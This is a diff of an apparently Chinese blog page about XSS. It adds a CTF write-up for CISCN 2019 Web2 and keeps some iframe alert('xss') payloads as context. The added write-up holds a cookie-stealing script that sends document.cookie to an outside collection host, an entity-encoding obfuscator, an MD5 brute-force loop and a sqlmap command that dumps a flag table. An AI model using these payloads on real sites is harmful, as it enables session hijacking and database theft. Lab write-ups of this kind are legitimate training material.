@@ -391,14 +391,14 @@ echo $_POST[&#39;name&#39;];
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    237
+                    492
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 				
@@ -450,7 +450,25 @@ Name<span class="token punctuation">:</span> <span class="token markup"><span cl
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>height<span class="token operator">=</span><span class="token number">0</span> width<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> 
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token number">1</span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> y<span class="token operator">=</span><span class="token number">2016</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> </code></pre>
+<h4 id="CISCN-2019-华东北赛区-Web2"><a href="#CISCN-2019-华东北赛区-Web2" class="headerlink" title="CISCN 2019 华东北赛区 Web2"></a>CISCN 2019 华东北赛区 Web2</h4><p><img src="1.png" alt=""><br>方法： 投稿-》反馈-》获得管理员cookie-》注入</p>
+<p>HTML Markup转码</p>
+<pre><code>in_str = &quot;(function(){window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;
 
+output = &quot;&quot;
+
+for c in in_str:
+    output += &quot;&amp;#&quot; + str(ord(c))
+
+print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>丢平台上后<br>然后爆破md5</p>
+<pre><code>import hashlib
+
+for i in range(1, 10000001):
+    s = hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()[0:6]
+    if s == &quot;4426f0&quot;:
+        print(i)
+        break</code></pre><p>置管理员 cookie，猜测后台路径，发现 /admin.php 能访问。<br>注入获取flag</p>
+<pre><code>python sqlmap.py -u http://502ce080-5cd5-4c3d-8467-1fc354132f71.node3.buuoj.cn/admin.php?id=2 --cookie=&quot;PHPSESSID=57bd5e76b87b83da7e7332ad6f60cdd7&quot; -T flag --dump --flush-session
+--fresh-queries --fresh-queries --delay 0.1</code></pre>
             </div>
             <hr/>
 
@@ -799,7 +817,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">150k</span>&nbsp;字
+                class="white-color">150.2k</span>&nbsp;字
             
             
             
